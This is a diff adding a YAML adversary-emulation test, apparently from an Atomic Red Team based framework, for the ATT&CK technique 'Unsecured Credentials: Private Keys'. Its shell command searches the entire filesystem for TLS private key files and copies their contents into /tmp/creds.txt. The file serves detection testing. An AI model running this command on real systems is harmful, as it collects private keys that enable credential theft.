@@ -1,0 +1,44 @@
+- id: 5e417277-0ae7-4ad5-a3e8-0fa27c122b29
+  name: Find TLS private key files
+  description: 'Find TLS private key files on the filesystem by extension.
+
+    Extensions include *.key, *.pem, *.p12, and *.pfx'
+  tactic: credential-access
+  technique:
+    attack_id: T1552.004
+    name: 'Unsecured Credentials: Private Keys'
+  platforms:
+    linux:
+      sh:
+        command: for file_extension in *.key *.pem *.p12 *.pfx; do find / -name "$file_extension"
+          -type f -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+          _ {} \; 2>/dev/null; done
+        cleanup: rm -f /tmp/creds.txt
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - atomic-red-team
+  - t1552.004
+  - credential-access
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      file_path:
+        description: Path to search
+        type: string
+        default: /
+      file_extensions:
+        description: Space-separated TLS key file extensions to search for
+        type: string
+        default: '*.key *.pem *.p12 *.pfx'
+      optional_flags:
+        description: optional flags passed into find that should be ran
+        type: string
+        default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+          _ {} \;
+    technique_created: '2020-02-04T13:06:49.258Z'
+    atomic_guid: 5e417277-0ae7-4ad5-a3e8-0fa27c122b29
+    import_timestamp: '2026-09-05T06:41:20.039145Z'
